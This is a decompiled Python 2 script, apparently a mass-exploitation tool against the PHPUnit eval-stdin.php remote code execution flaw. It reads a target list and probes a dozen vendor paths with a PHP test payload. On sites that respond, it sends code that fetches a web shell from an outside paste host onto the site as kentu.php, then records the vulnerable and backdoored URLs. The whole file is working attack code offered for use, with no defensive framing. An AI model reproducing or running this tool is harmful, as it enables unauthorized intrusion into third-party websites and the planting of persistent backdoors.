# uncompyle6 version 3.6.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.12 (default, Oct  8 2019, 14:14:10)
# [GCC 5.4.0 20160609]
# Embedded file name: <daffa>
# Compiled at: 2020-06-30 12:15:04
import re, sys, requests, os, random, string, time, sys, os, threading, time, re, requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import requests, re, urllib, urllib2, os, sys, codecs, binascii, json, argparse
from multiprocessing.dummy import Pool
import requests, os, sys, time, codecs, urllib, urllib2, binascii, base64, subprocess
from time import time as timer
import time
from random import sample as rand
from Queue import Queue
from platform import system
from urlparse import urlparse
from optparse import OptionParser
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
import sys, requests, re, datetime
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)
import requests, re, os, sys, codecs, random
from multiprocessing.dummy import Pool
from time import time as timer
import time
from colorama import Fore
from urlparse import urlparse
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from platform import system
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
fh = Fore.RED
fc = Fore.CYAN
fo = Fore.MAGENTA
fw = Fore.WHITE
fy = Fore.YELLOW
fbl = Fore.BLUE
fg = Fore.GREEN
sd = Style.DIM
fb = Fore.RESET
sn = Style.NORMAL
sb = Style.BRIGHT
warnings.simplefilter('ignore', InsecureRequestWarning)
reload(sys)
sys.setdefaultencoding('utf8')
ktnred = '\x1b[31m'
ktngreen = '\x1b[32m'
ktn3yell = '\x1b[33m'
ktn4blue = '\x1b[34m'
ktn5purp = '\x1b[35m'
ktn6blueblue = '\x1b[36m'
ktn7grey = '\x1b[37m'
CEND = '\x1b[0m'

def urlfix(url):
    if url[(-1)] == '/':
        pattern = re.compile('(.*)/')
        site = re.findall(pattern, url)
        url = site[0]
    if url[:7] != 'http://' and url[:8] != 'https://':
        url = 'http://' + url
    return url


def HACKIT(url, payload, shell_path):
    try:
        cmd1 = '<?php copy("https://0paste.com/74084.txt", "kentu.php"); ?>'
        see = requests.session()
        Agent4 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        ktn4 = see.get(payload, headers=Agent4, data=cmd1, verify=False, timeout=30)
        if ktn4:
            try:
                ktn5 = see.get(shell_path, headers=Agent4, verify=False, timeout=30)
                if 'Raiz0WorM' in ktn5.text:
                    print ('{}{} [SWAT-UNIT] ----> SUCCESS UPLOAD [200] :').format(fg, sb) + url
                    open('shell____S.txt', 'a').write(shell_path + '\n')
                else:
                    print ('{}{} [NOT VULNERABILITY] [0] -------> ').format(fr, sb) + url
            except:
                pass

        else:
            print ('{}{} Shell UPLOADING FAILED [0.2] -------> ').format(fr, sb) + url
    except:
        print ('{}{} Site Error !! Trying... [0.2] -------> ').format(fr, sb) + url


def EXPLOIT(url):
    try:
        paths = [
         '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
         '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php', '/vendor/phpunit/src/Util/PHP/eval-stdin.php',
         '/vendor/phpunit/Util/PHP/eval-stdin.php', '/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
         '/phpunit/phpunit/Util/PHP/eval-stdin.php', '/phpunit/src/Util/PHP/eval-stdin.php',
         '/phpunit/Util/PHP/eval-stdin.php', '/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
         '/lib/phpunit/phpunit/Util/PHP/eval-stdin.php', '/lib/phpunit/src/Util/PHP/eval-stdin.php',
         '/lib/phpunit/Util/PHP/eval-stdin.php']
        for path in paths:
            try:
                cmd = '<?php echo "Raiz0WorM HaCkEr"; ?>'
                shell_path = url + path.replace('eval-stdin.php', 'kentu.php')
                payload = url + path
                se3 = requests.session()
                Agent3 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
                ktn3 = se3.get(payload, headers=Agent3, data=cmd, verify=False, timeout=30)
                if 'Raiz0WorM' in ktn3.text:
                    print ('{}{} [VULNERABLE SITE] ---->  [100] :').format(fy, sb) + url
                    open('ooh___vlun.txt', 'a').write(payload + '\n')
                    HACKIT(url, payload, shell_path)
                    break
                else:
                    print ('{}{} [NOT VULNERABILITY] [0] -------> ').format(fr, sb) + url
            except:
                print ('{}{} Shell UPLOADING FAILED [0.2] -------> ').format(fr, sb) + url

    except:
        print ('{}{} Site Error !! Trying... [0.2] -------> ').format(fr, sb) + url


def check(url):
    try:
        url = urlfix(url)
        Agent = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        se = requests.session()
        ktn1 = se.get(url, headers=Agent, verify=False, timeout=30)
        if ktn1.status_code == 200:
            print ('{}{} [SITE IS WORKING LOOKING FOR VULN] ---->  [100] :').format(fy, sb) + url
            EXPLOIT(url)
        else:
            print ('{}{} SITE IS DOWN... -------> ').format(fr, sb) + url
    except:
        pass


def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = "\n\n  [#] Create By ::\n\t  ___                                                    ______        \n\t / _ \\                                                   |  ___|       \n\t/ /_\\ \\_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __\n\t|  _  | '_ \\ / _ \\| '_ \\| | | | '_ ` _ \\ / _ \\| | | / __||  _/ _ \\ \\/ /\n\t| | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \\__ \\| || (_) >  < \n\t\\_| |_/_| |_|\\___/|_| |_|\\__, |_| |_| |_|\\___/ \\__,_|___/\\_| \\___/_/\\_\\ \n\t                          __/ |\n\t                         |___/ PhpUnit 0day new version v2\n\n"
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)


logo()

def Main():
    list = raw_input(('{}{}\n\t [ALL-PHPUNIT-VULN] List Please !  : ').format(fr, sb))
    list = open(list, 'r').read().splitlines()
    try:
        ThreadPool = Pool(14)
        Threads = ThreadPool.map(check, list)
    except:
        pass


if __name__ == '__main__':
    Main()
# okay decompiling temp.pyc
